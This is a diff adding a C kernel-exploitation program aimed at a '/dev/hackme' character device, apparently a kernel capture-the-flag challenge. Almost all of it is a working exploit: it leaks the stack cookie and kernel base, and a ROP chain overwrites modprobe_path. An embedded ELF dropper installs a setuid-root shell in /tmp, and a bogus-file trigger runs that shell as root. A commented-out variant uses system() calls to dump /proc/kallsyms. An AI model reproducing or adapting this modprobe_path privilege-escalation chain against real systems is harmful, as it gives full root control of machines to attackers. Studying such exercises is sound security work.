@@ -1,0 +1,238 @@
+#include <fcntl.h> 
+#include <poll.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <unistd.h> 
+
+int global_fd;
+
+void open_dev() {
+  global_fd = open("/dev/hackme", O_RDWR);
+  if (global_fd < 0) {
+    puts("[!] Failed to open device");
+    exit(-1);
+  } else {
+    puts("[*] Opened device");
+  }
+}
+
+/*
+ * Dropper...:
+ * fd = open("/tmp/win", 0_WRONLY | O_CREAT | O_TRUNC);
+ * write(fd, shellcode, shellcodeLen);
+ * chmod("/tmp/win", 0x4755);
+ * close(fd);
+ * exit(0)
+ *
+ * ... who drops some shellcode ELF:
+ * setuid(0);
+ * setgid(0);
+ * execve("/bin/sh", ["/bin/sh"], NULL);
+ */
+ 
+struct stat st = {0};
+char *win_condition = "/tmp/w";
+char *dummy_file = "/tmp/d";
+
+unsigned char dropper[] = {
+    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+    0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xb0, 0x02, 0x48, 0x8d, 0x3d, 0x3b, 0x00, 0x00, 0x00, 0xbe, 0x41, 0x02,
+    0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x8d, 0x35, 0x33, 0x00,
+    0x00, 0x00, 0xba, 0xa0, 0x00, 0x00, 0x00, 0xb0, 0x01, 0x0f, 0x05, 0x48,
+    0x31, 0xc0, 0xb0, 0x03, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x13, 0x00, 0x00,
+    0x00, 0xbe, 0xff, 0x0d, 0x00, 0x00, 0xb0, 0x5a, 0x0f, 0x05, 0x48, 0x31,
+    0xff, 0xb0, 0x3c, 0x0f, 0x05, 0x00, 0x00, 0x00, 0x2f, 0x74, 0x6d, 0x70,
+    0x2f, 0x77, 0x69, 0x6e, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e,
+    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
+    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
+    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05,
+    0x48, 0x31, 0xff, 0xb0, 0x6a, 0x0f, 0x05, 0x48, 0xbb, 0xd1, 0x9d, 0x96,
+    0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x48, 0x89, 0xe7,
+    0x56, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05};
+    
+void win() {
+  puts("[+] Hello from user land!");
+  if (stat("/tmp", &st) == -1) {
+    puts("[*] Creating /tmp");
+    int ret = mkdir("/tmp", S_IRWXU);
+    if (ret == -1) {
+      puts("[!] Failed");
+      exit(-1);
+    }
+  }
+
+  FILE *fptr = fopen(win_condition, "w");
+  if (!fptr) {
+    puts("[!] Failed to open win condition");
+    exit(-1);
+  }
+
+  if (fwrite(dropper, sizeof(dropper), 1, fptr) < 1) {
+    puts("[!] Failed to write win condition");
+    exit(-1);
+  }
+
+  fclose(fptr);
+
+  if (chmod(win_condition, 0777) < 0) {
+    puts("[!] Failed to chmod win condition");
+    exit(-1);
+  };
+  puts("[+] Wrote win condition (dropper) -> /tmp/w");
+
+  fptr = fopen(dummy_file, "w");
+  if (!fptr) {
+    puts("[!] Failed to open dummy file");
+    exit(-1);
+  }
+
+  if (fputs("\x37\x13\x42\x42", fptr) == EOF) {
+    puts("[!] Failed to write dummy file");
+    exit(-1);
+  }
+  fclose(fptr);
+
+  if (chmod(dummy_file, 0777) < 0) {
+    puts("[!] Failed to chmod win condition");
+    exit(-1);
+  };
+  puts("[+] Wrote modprobe trigger -> /tmp/d");
+
+  puts("[*] Triggering modprobe by executing /tmp/d");
+  execv(dummy_file, NULL);
+
+  puts("[*] Trying to drop root-shell");
+  system("/tmp/win");
+}
+unsigned long user_cs, user_ss, user_rflags, user_sp;
+
+void save_state() {
+  __asm__(".intel_syntax noprefix;"
+          "mov user_cs, cs;"
+          "mov user_ss, ss;"
+          "mov user_sp, rsp;"
+          "pushf;"
+          "pop user_rflags;"
+          ".att_syntax;");
+  puts("[*] Saved state");
+}
+
+void print_leak(unsigned long *leak, unsigned n) {
+  for (unsigned i = 0; i < n; ++i) {
+    printf("%u: %lx\n", i, leak[i]);
+  }
+}
+
+unsigned long cookie;
+unsigned long image_base;
+unsigned long kpti_trampoline;
+unsigned long pop_rax_ret;                // pop rax; ret;
+unsigned long pop_rbx_r12_rbp_ret;        // pop rbx ; pop r12 ; pop rbp ; ret;
+unsigned long write_ptr_rbx_rax_pop2_ret; // mov qword ptr [rbx], rax; pop rbx;
+                                          // pop rbp; ret;
+unsigned long modprobe_path;
+
+void leak(void) {
+  unsigned n = 40;
+  unsigned long leak[n];
+  ssize_t r = read(global_fd, leak, sizeof(leak));
+  cookie = leak[16];
+  image_base = leak[38] - 0xa157ULL;
+  kpti_trampoline = image_base + 0x200f10UL + 22UL;
+  pop_rax_ret = image_base + 0x4d11UL;
+  pop_rbx_r12_rbp_ret = image_base + 0x3190UL;
+  write_ptr_rbx_rax_pop2_ret = image_base + 0x306dUL;
+  modprobe_path = image_base + 0x1061820UL;
+
+  printf("[*] Leaked %zd bytes\n", r);
+  // print_leak(leak, n);
+  printf("    --> Cookie: %lx\n", cookie);
+  printf("    --> Image base: %lx\n", image_base);
+}
+/*
+void get_shell(void) {
+  system("echo '#!/bin/sh\ncat /proc/kallsyms | head > /tmp/flag' > /tmp/x");
+  system("chmod +x /tmp/x");
+
+  // Tạo file dummy không hợp lệ
+  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
+  system("chmod +x /tmp/dummy");
+
+  // Trigger modprobe
+  system("/tmp/dummy");
+
+  // Đọc flag
+  system("cat /tmp/flag");
+}*/
+
+void overflow(void) {
+  unsigned n = 50;
+  unsigned long payload[n];
+  unsigned off = 16;
+  payload[off++] = cookie;
+  payload[off++] = 0x0;            // rbx
+  payload[off++] = 0x0;            // r12
+  payload[off++] = 0x0;            // rbp
+  payload[off++] = pop_rax_ret;    // return address
+  payload[off++] = 0x772f706d742f; // rax <- "/tmp/w"
+  payload[off++] = pop_rbx_r12_rbp_ret;
+  payload[off++] = modprobe_path;              // rbx <- modprobe_path
+  payload[off++] = 0x0;                        // dummy r12
+  payload[off++] = 0x0;                        // dummy rbp
+  payload[off++] = write_ptr_rbx_rax_pop2_ret; // modprobe_path <- "/tmp/x"
+  payload[off++] = 0x0;                        // dummy rbx
+  payload[off++] = 0x0;                        // dummy rbp
+  payload[off++] = kpti_trampoline;  // swapgs_restore_regs_and_return_to_usermode + 22
+  payload[off++] = 0x0; // dummy rax
+  payload[off++] = 0x0; // dummy rdi
+  payload[off++] = (unsigned long)win + 1;
+  payload[off++] = user_cs;
+  payload[off++] = user_rflags;
+  payload[off++] = user_sp;
+  payload[off++] = user_ss;
+
+  puts("[*] Prepared payload to overwrite modprobe_path");
+  ssize_t w = write(global_fd, payload, sizeof(payload));
+
+  puts("[!] Should never be reached");
+}
+
+int main() {
+
+  save_state();
+
+  open_dev();
+
+  leak();
+
+  overflow();
+
+  puts("[!] Should never be reached");
+
+  return 0;
+}
